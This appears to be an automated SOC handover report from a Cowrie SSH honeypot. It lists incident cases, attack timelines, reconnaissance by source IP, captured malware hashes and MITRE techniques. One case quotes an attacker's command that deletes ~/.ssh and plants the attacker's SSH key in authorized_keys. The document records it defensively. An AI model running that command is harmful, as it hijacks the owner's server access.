| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:57:07` | `cowrie.session.connect` |
| `2026-06-20 20:57:07` | `cowrie.client.version` |
| `2026-06-20 20:57:08` | `cowrie.client.kex` |
| `2026-06-20 20:57:08` | `cowrie.login.success` |
| `2026-06-20 20:57:09` | `cowrie.session.params` |
| `2026-06-20 20:57:09` | `cowrie.command.input` |
| `2026-06-20 20:57:09` | `cowrie.command.failed` |
| `2026-06-20 20:57:09` | `cowrie.log.closed` |
| `2026-06-20 20:57:09` | `cowrie.session.params` |
| `2026-06-20 20:57:09` | `cowrie.command.input` |
| `2026-06-20 20:57:10` | `cowrie.session.file_download` |
| `2026-06-20 20:57:10` | `cowrie.log.closed` |
| `2026-06-20 20:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c728a3915a99

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:57 |
| **Last Seen** | 2026-06-20 20:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:57:12` | `cowrie.session.connect` |
| `2026-06-20 20:57:12` | `cowrie.client.version` |
| `2026-06-20 20:57:12` | `cowrie.client.kex` |
| `2026-06-20 20:57:13` | `cowrie.login.success` |
| `2026-06-20 20:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4a43a890c06

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:57 |
| **Last Seen** | 2026-06-20 20:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:57:33` | `cowrie.session.connect` |
| `2026-06-20 20:57:33` | `cowrie.client.version` |
| `2026-06-20 20:57:33` | `cowrie.client.kex` |
| `2026-06-20 20:57:34` | `cowrie.login.success` |
| `2026-06-20 20:57:35` | `cowrie.session.params` |
| `2026-06-20 20:57:35` | `cowrie.command.input` |
| `2026-06-20 20:57:35` | `cowrie.command.failed` |
| `2026-06-20 20:57:35` | `cowrie.log.closed` |
| `2026-06-20 20:57:35` | `cowrie.session.params` |
| `2026-06-20 20:57:35` | `cowrie.command.input` |
| `2026-06-20 20:57:35` | `cowrie.session.file_download` |
| `2026-06-20 20:57:35` | `cowrie.log.closed` |
| `2026-06-20 20:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a71374930a

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:57 |
| **Last Seen** | 2026-06-20 20:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:57:38` | `cowrie.session.connect` |
| `2026-06-20 20:57:38` | `cowrie.client.version` |
| `2026-06-20 20:57:38` | `cowrie.client.kex` |
| `2026-06-20 20:57:39` | `cowrie.login.success` |
| `2026-06-20 20:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.176.79[.]137` | **30** | 2026-06-20 20:28 | 2026-06-20 20:59 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `153.117.1[.]166` | **22** | 2026-06-20 21:04 | 2026-06-20 21:09 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `118.139.164[.]171` | **2** | 2026-06-20 20:36 | 2026-06-20 20:40 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.80.88[.]160` | **2** | 2026-06-20 20:58 | 2026-06-20 20:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]215` | **2** | 2026-06-20 20:38 | 2026-06-20 20:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]141` | 1 | 2026-06-20 20:53 | 2026-06-20 20:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]146` | 1 | 2026-06-20 20:53 | 2026-06-20 20:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `123.129.245[.]249` | 1 | 2026-06-20 19:52 | 2026-06-20 19:53 | 46s | 0 | `T1592` | 🟢 LOW |
| `135.148.33[.]168` | 1 | 2026-06-20 21:19 | 2026-06-20 21:20 | 45s | 0 | `T1592` | 🟢 LOW |
| `146.120.247[.]158` | 1 | 2026-06-20 20:38 | 2026-06-20 20:39 | 12s | 0 | `T1592` | 🟢 LOW |
| `160.191.245[.]48` | 1 | 2026-06-20 20:51 | 2026-06-20 20:52 | 30s | 0 | `T1592` | 🟢 LOW |
| `172.184.134[.]210` | 1 | 2026-06-20 21:20 | 2026-06-20 21:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.206.113[.]91` | 1 | 2026-06-20 20:05 | 2026-06-20 20:05 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.89.198[.]191` | 1 | 2026-06-20 20:35 | 2026-06-20 20:35 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.39.140[.]2` | 1 | 2026-06-20 20:45 | 2026-06-20 20:45 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]213` | 1 | 2026-06-20 20:38 | 2026-06-20 20:38 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 44/100 | 🟡 MEDIUM | **35/73** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `146.120.247[.]158` | RU | Ediniy Operator Svyazi LLC | **100** ⚠️ | 2 |
| `172.184.134[.]210` | US | Microsoft Limited | **100** ⚠️ | 0 |
| `104.152.52[.]141` | US | Rethem Hosting LLC | **100** ⚠️ | 50 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 9 |
| `104.152.52[.]146` | US | Rethem Hosting LLC | **100** ⚠️ | 50 |
| `36.39.140[.]2` | KR | HVChungnam | **100** ⚠️ | 50 |
| `219.89.198[.]191` | NZ | Spark New Zealand Trading Ltd | **100** ⚠️ | 48 |
| `66.132.172[.]213` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `87.236.176[.]215` | GB | Driftnet Ltd | **100** ⚠️ | 50 |
| `160.191.245[.]48` | VN | Hoang Dieu Cloud Computing Company Limited | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 56 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 35 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 17 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 87 cases |
| Tool 34  | Credential Extractor        | ✅ 52 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (1.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 16 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 17 priority case(s) shown individually · 16 recon entry/entries in table (5 group(s) consolidating 58 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-20T21:22:29Z_
